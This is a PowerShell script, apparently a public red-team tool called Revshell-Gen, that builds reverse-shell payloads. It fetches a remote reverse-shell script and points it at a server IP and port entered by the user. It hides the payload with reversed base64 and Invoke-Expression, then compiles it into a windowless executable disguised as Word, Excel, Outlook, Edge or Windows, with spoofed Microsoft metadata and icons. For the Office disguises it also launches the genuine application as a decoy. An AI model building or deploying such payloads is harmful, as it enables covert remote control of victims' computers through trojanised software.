[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; Set-StrictMode -Off
$ProgressPreference = "SilentlyContinue" ; $ErrorActionPreference = "SilentlyContinue"
$Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.0 - by @JoelGMSec" ; $Host.UI.RawUI.BackgroundColor = 'Black'

function Show-Banner { Clear-Host
    Write-Host
    Write-Host "__________                    ___            __   __    " -NoNewLine -ForegroundColor Blue ; Write-Host "            ________        v2.0   " -ForegroundColor Green
    Write-Host "\______   \ ____ __  __ _____|   |___  ____ |  | |  |   " -NoNewLine -ForegroundColor Blue ; Write-Host "           /   ____/  ____ _____   " -ForegroundColor Green   
    Write-Host " |       _// __ \  \/  /  ___/       |/ __ \|  | |  |   " -NoNewLine -ForegroundColor Blue ; Write-Host "  ______  /   /  ___ / __ \     \  " -ForegroundColor Green
    Write-Host " |    |   \  ___/\    /\___ \|   |   |  ___/|  |_|  |__ " -NoNewLine -ForegroundColor Blue ; Write-Host " /_____/  \   \__\  \  ___/  |   \ " -ForegroundColor Green
    Write-Host " |____|_  /\____/ \__//_____/|___|___|\____/_____/____/ " -NoNewLine -ForegroundColor Blue ; Write-Host "           \________/\____/__|_  / " -ForegroundColor Green
    Write-Host "        \/                                              " -NoNewLine -ForegroundColor Blue ; Write-Host "                               \/  " -ForegroundColor Green
    Write-Host
    Write-Host "------------------------------------------------------------------------------------------" -ForegroundColor Gray
    Write-Host "         [:::::: HTTP-revshell Payload Generator :: Created by @JoelGMSec ::::::]         " -ForegroundColor Yellow
    Write-Host "   [:::::: HTTP-revshell by 3v4Si0N :: https://github.com/3v4Si0N/HTTP-revshell ::::::]   " -ForegroundColor Yellow
    Write-Host "------------------------------------------------------------------------------------------" -ForegroundColor Gray
    Write-Host }

function Show-Menu {
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Word" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Excel" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Outlook" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Edge" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Office" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Microsoft Windows" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Custom template" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Show help" -ForegroundColor Gray
    Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
    Write-Host }

function Show-Help {
    Write-Host ; Write-Host "This script allows you to create an executable file with the payload necessary to use" -ForegroundColor Gray
    Write-Host "HTTP-revshell, you just need to follow the instructions on the screen to generate it." -ForegroundColor Gray
    Write-Host "There are 6 predefined templates and a customizable one, with the data that you like." -ForegroundColor Gray
    Write-Host
    Write-Host "For more information, see the readme file on the GitHub page:" -ForegroundColor Gray 
    Write-Host "https://github.com/3v4Si0N/HTTP-revshell" -ForegroundColor Blue
    Write-Host ; pause }

function Kill-Program {
    Write-Host ; Write-Host "[!] Deleting temporary files.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; Remove-Item Invoke-WebRev.ps1,ps2exe.ps1 ; exit }

function Best64-Encoder {
    $filepath = "$pwd\Invoke-WebRev.ps1"
    $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filepath)) ; $b64 = "`"$base64`""
    $base64rev = $b64.ToCharArray() ; [array]::Reverse($base64rev) ; $best64 = -join $base64rev | out-file Invoke-WebRev.ps1
    @('$best64code=') + (Get-Content "$pwd\Invoke-WebRev.ps1") | Set-Content "$pwd\Invoke-WebRev.ps1"
    Add-Content .\Invoke-WebRev.ps1 '$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null'
    Add-Content .\Invoke-WebRev.ps1 '$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))'
    Add-Content .\Invoke-WebRev.ps1 'Invoke-Expression $LoadCode'}

# Main function
function Create-Payload {
    do { Show-Banner ; Show-Menu

        $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
        $Random = New-Object System.Random ; "Choose one template:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {

        '1' { $template = 'Word' }
        '2' { $template = 'Excel' }
        '3' { $template = 'Outlook' }
        '4' { $template = 'Edge' }
        '5' { $template = 'Office' }
        '6' { $template = 'Windows' }
        '7' { $template = 'Custom' }
        'H' { Show-Help }
        'X' { Kill-Program }

        default { Write-Host ; Write-Host "[!] Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}}

    until ($input -in '1','2','3','4','5','6','7','X')

# Template data
if($template -in 'Word') { $Name = "WINWORD.exe" ; $Title = "Microsoft Word" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $Icon = ".\icons\word.ico" }
if($template -in 'Excel') { $Name = "EXCEL.exe" ; $Title = "Microsoft Excel" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $Icon = ".\icons\excel.ico" }
if($template -in 'Outlook') { $Name = "OUTLOOK.exe" ; $Title = "Microsoft Outlook" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $Icon = ".\icons\outlook.ico" }
if($template -in 'Edge') { $Name = "msedge.exe" ; $Title = "Microsoft Edge" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Edge" ; $Version = "83.0.478.58" ; $Icon = ".\icons\edge.ico" }
if($template -in 'Office') { $Name = "office.exe" ; $Title = "Microsoft Office" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Office" ; $Version = "16.0.12827.20336" ; $Icon = ".\icons\office.ico" }
if($template -in 'Windows') { $Name = "windows.exe" ; $Title = "Microsoft Windows" ; $Company = "Microsoft Corporation" ; $Product = "Microsoft Windows" ; $Version = "10.0.0.0" ; $Icon = ".\icons\windows.ico" }

# Custom template
if($template -in 'Custom') { 
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Enter the name of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $CustomName = $Host.UI.ReadLine()
    
    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Enter the title of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $CustomTitle = $Host.UI.ReadLine()

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Enter the company of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $CustomCompany = $Host.UI.ReadLine()

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Enter the product of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $CustomProduct = $Host.UI.ReadLine()

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Enter the version of the application:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $CustomVersion = $Host.UI.ReadLine()

    $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
    $Random = New-Object System.Random ; "Enter the path of the icon file:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $CustomIcon = $Host.UI.ReadLine()

    $Name = "$CustomName" ; $Title = "$CustomTitle" ; $Company = "$CustomCompany" ; $Product = "$CustomProduct" ; $Version = "$CustomVersion" ; $Icon = "$CustomIcon" }

# IP to connect
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
$Random = New-Object System.Random ; "Enter the IP of your server:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $ip = $Host.UI.ReadLine()

# Listening port
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
$Random = New-Object System.Random ; "Now, the listening port:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $port = $Host.UI.ReadLine()

# Enable/Disable SSL
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
$Random = New-Object System.Random ; "Do you want to encrypt with SSL? [y/n]:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $enablessl = $Host.UI.ReadLine()

# Download Invoke-WebRev.ps1 & add content
Write-Host ; Write-Host "[+] Downloading last version of Invoke-WebRev.." -ForegroundColor Blue
(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/dev/Invoke-WebRev.ps1","Invoke-WebRev.ps1")

# Open legitimate office app 
if($Name -in 'WINWORD.exe','EXCEL.exe','OUTLOOK.exe') { 

    $regkey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths'
    $appPaths = Get-ChildItem $regkey |
     Get-ItemProperty |
     ? { $_.'(default)' } |
     select -Expand '(default)' |
     Split-Path -Parent |
     % { [Environment]::ExpandEnvironmentVariables($_.TrimStart('"')) } |
     select -Unique
    $env:PATH += ';' + ($appPaths -join ';')

    $Office = $appPaths | findstr /i office | Select -First 1
    if($Office) { Add-Content .\Invoke-WebRev.ps1 "& `"$Office\$Name`" 2>&1> `$null" }}

if($enablessl -like 'y') { $ssl = "-ssl" } ; Add-Content .\Invoke-WebRev.ps1 "Invoke-WebRev -ip $ip -port $port $ssl"

# Download PS2exe & encode+compile exe file
Write-Host ; Write-Host "[+] Downloading PS2exe and generating payload.." -ForegroundColor Blue
(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/TechNet-Gallery/master/PS2EXE-GUI/ps2exe.ps1","ps2exe.ps1")
Best64-Encoder ; .\ps2exe.ps1 -inputFile .\Invoke-WebRev.ps1 -outputFile $Name -title $Title -company $Company -product $Product -version $Version -iconFile $Icon -noConsole 2>&1> $null

Write-Host ; Write-Host "[i] Done!" -ForegroundColor Green ; Start-Sleep -milliseconds 2000

# Repeat operation
$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
$Random = New-Object System.Random ; "Do you want to create another one? [y/n]:` "-split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
$Host.UI.RawUI.ForegroundColor = 'Green' ; $repeat = $Host.UI.ReadLine()

if($repeat -like 'y') { Create-Payload } else { Kill-Program }}

# Execute code
Create-Payload